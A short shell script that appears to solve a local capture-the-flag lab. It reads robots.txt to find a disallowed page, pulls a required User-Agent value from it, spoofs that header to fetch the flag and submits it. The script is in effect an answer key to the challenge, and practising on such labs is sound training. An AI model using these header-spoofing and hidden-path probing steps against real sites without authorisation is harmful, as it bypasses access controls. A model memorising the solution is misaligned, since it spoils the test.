page=$(curl -s http://127.0.0.1:8080/robots.txt | awk '/Disallow/ {print $2}')
ua=$(curl -s "http://127.0.0.1:8080$page" | grep -o 'User-Agent: [a-z-]*' | awk '{print $2}')
lab submit "$(curl -s -A "$ua" "http://127.0.0.1:8080$page" | grep -o 'flag{[^}]*}')"
